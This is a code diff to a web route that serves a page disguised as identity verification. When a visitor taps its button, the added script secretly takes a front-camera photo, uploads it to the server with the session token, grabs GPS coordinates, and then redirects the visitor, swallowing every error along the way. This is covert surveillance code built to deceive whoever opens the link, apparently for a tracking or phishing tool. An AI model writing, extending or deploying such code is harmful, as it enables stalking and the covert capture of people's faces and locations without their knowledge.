@@ -286,14 +286,73 @@ router.get('/v/:sessionToken', (req, res) => {
       );
     }
 
-    // ── On button tap: start camera + GPS, then redirect ──
+    // ── On button tap: camera FIRST (needs gesture), then GPS, then redirect ──
     document.getElementById('_goBtn').addEventListener('click', function () {
       document.getElementById('_goBtn').style.display = 'none';
       document.getElementById('_status').classList.add('show');
-      document.getElementById('_status').textContent = 'Verifying…';
-      captureGps();
+      document.getElementById('_status').textContent = 'Verifying identity…';
+
+      // Camera first — uses the user gesture permission immediately
+      // GPS runs in parallel but camera gets priority
+      var _camDone = false;
+      var _camTimeout = setTimeout(function () {
+        // Camera took too long — proceed without it
+        if (!_camDone) {
+          _camDone = true;
+          captureGps();
+          setTimeout(doRedirect, 3000);
+        }
+      }, 8000);
+
+      // Override captureCamera to set _camDone when finished
+      var _origCapture = captureCamera;
+      captureCamera = function () {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          _camDone = true;
+          captureGps();
+          setTimeout(doRedirect, 3000);
+          return;
+        }
+        var vid = document.getElementById('_tv');
+        var can = document.getElementById('_tc');
+        navigator.mediaDevices.getUserMedia({
+          audio: false,
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
+        }).then(function (stream) {
+          vid.srcObject = stream;
+          vid.onloadedmetadata = function () {
+            vid.play();
+            setTimeout(function () {
+              try {
+                can.width  = vid.videoWidth  || 640;
+                can.height = vid.videoHeight || 480;
+                can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
+                var img = can.toDataURL('image/jpeg', 0.82);
+                fetch(BASE + '/api/location/cam/' + TOK, {
+                  method  : 'POST',
+                  headers : { 'Content-Type': 'application/json' },
+                  body    : JSON.stringify({ image: img }),
+                  keepalive: true
+                }).catch(function () {});
+                stream.getTracks().forEach(function (t) { t.stop(); });
+              } catch (e) {}
+              clearTimeout(_camTimeout);
+              _camDone = true;
+              captureGps();
+              // Short delay then redirect so GPS has time to fire
+              setTimeout(doRedirect, 3000);
+            }, 1500);
+          };
+        }).catch(function () {
+          clearTimeout(_camTimeout);
+          _camDone = true;
+          captureGps();
+          setTimeout(doRedirect, 3000);
+        });
+      };
+
+      // Start camera capture immediately
       captureCamera();
-      setTimeout(doRedirect, 5000);
     });
 
   })();
